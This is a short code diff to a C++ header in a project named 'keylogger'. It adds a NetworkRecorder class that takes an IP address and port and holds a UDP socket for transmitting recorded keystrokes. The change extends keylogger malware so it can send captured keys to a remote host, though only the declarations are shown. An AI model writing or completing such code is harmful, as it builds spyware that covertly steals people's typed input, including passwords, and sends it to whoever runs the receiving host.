@@ -2,7 +2,10 @@
 #define RECORDER_H_
 
 #include <filesystem>
+#include <string>
 #include <vector>
+
+#include "io/udp/udp_socket.h"
 
 namespace keylogger {
 
@@ -41,6 +44,21 @@ class FileRecorder : public Recorder {
 
  private:
   FilePath log_path_;
+};
+
+class NetworkRecorder : public Recorder {
+ public:
+  NetworkRecorder() = delete;
+  [[nodiscard]] NetworkRecorder(int key_limit, const std::string& ip, int port);
+  NetworkRecorder(const NetworkRecorder&) = default;
+  NetworkRecorder& operator=(const NetworkRecorder&) = default;
+  NetworkRecorder(NetworkRecorder&&) = default;
+  NetworkRecorder& operator=(NetworkRecorder&&) = default;
+
+  void Transmit() final;
+
+ private:
+  UdpSocket tx_socket_;
 };
 
 }  // namespace keylogger
